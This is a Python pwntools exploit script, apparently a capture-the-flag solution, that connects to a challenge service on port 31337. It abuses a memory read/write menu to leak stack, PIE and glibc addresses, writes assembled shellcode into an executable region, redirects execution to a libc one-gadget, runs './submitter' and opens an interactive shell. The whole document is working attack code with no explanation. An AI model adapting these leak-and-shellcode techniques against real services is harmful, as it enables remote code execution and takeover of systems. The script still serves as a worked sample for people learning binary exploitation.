#!/usr/bin/env python3

from pwn import *

context.arch='amd64'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
# io = process('../../handout/challenge')

go = lambda x: io.sendlineafter(b':', hex(x)[2:].encode())
go2 = lambda x: io.sendlineafter(b':', hex(u64(x))[2:].encode())

io.recvuntil(b'Choice')
go(1)
go(1)
io.recvuntil(b'Value:')
stack = int(io.recvline(), 16)
log.info('[STACK] %#x'%stack)

io.recvuntil(b'Choice')
go(1)
go(stack - 0x20)

io.recvuntil(b'Value:')
pie = int(io.recvline(), 16) - 0x1285
log.info('[PIE] %#x'%pie)

rwx = pie + 0x148C

__import__('time').sleep(1)

io.recvuntil(b'Choice')
go(1)
go(pie + 0x3538)

io.recvuntil(b'Value:')
libc = int(io.recvline(), 16) - 0x11bee0
log.info('[GLIBC] %#x'%libc)

prdi = libc + 0x16aff6
system = libc + 0x50d70
binsh = libc + 0x1d8678

sc = asm(f'''
    mov rax, 110
    syscall
    mov rdi, rax
    mov r8, 1
    mov rdx, 1
    mov r12, 8
    push r12
    mov r12, {rwx+0x100}
    push r12
    push rsp
    pop rsi
    mov r12, 8
    push r12
    mov r12, {pie+0x32a8}
    push r12
    push rsp
    pop rcx
    mov r12, {pie+0x11F0}
    mov r9, 0
    call r12
''')

sc = sc.ljust(0x100, b'\x90')
sc += p64(libc+0xebd38)

for i in range(len(sc) // 8):
    io.recvuntil(b'Choice')
    go(2)
    go2(sc[i*8:i*8+8]) # our shellcode
    go(rwx + (i*8))

io.recvuntil(b'Choice')
go(2)
go(rwx)
go(pie + 0x3538)

__import__('time').sleep(2)
io.recvuntil(b'Choice')
go(3)

io.sendline('./submitter')
print(io.recv(0x10000))

io.interactive()